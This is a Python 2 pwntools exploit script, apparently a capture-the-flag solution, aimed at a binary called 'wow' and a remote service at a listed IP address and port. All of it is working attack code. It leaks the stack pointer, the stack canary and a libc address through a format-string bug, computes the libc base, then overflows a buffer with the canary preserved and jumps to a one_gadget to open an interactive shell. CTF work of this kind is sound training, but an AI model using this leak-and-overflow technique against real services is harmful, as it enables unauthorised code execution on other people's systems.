#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
import time
from pwn import *
 
# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.log_level = 'debug'
exe = './wow'
lib = './libc.so.6'
 
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
 
 
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('139.199.99.130', 65188)
    else:
        return process([exe] + argv, *a, **kw)
 
# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
hbreak *0x400A59
hbreak *0x400794
continue
'''.format(**locals())
 
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
 
libc = ELF(lib)
 
libc_setbuf = libc.symbols['setbuf']
 
log.info('libc_setbuf 0x%x' % libc_setbuf)
 
io = start()
 
io.recvuntil('--')
io.recvuntil('***************************')
 
# max length: 6
io.send('evXnaK')
io.recvuntil('wow!\n')
 
 
# max length: 26
# 0x601028: got setbuf
io.send('%1$p %13$p %8$s\x00' + p64(0x601028))
r = io.recv().split(' ')
rsp = int(r[0], 16)
canary = int(r[1], 16)
setbuf = u64(r[2] + '\x00' * 2)
 
log.info('rsp    0x%x' % rsp)
log.info('canary 0x%x' % canary)
log.info('setbuf 0x%x' % setbuf)
 
libc_base = setbuf - libc_setbuf
 
log.info('libc   0x%x' % libc_base)
 
 
# 0x45216 find by one_gadget
rop_chain = 0x45216
payload = 'A' * (0x20 + 0x38)
payload += p64(canary)
payload += 'A' * 8
payload += p64(rop_chain + libc_base)
 
io.send(payload)
 
io.interactive()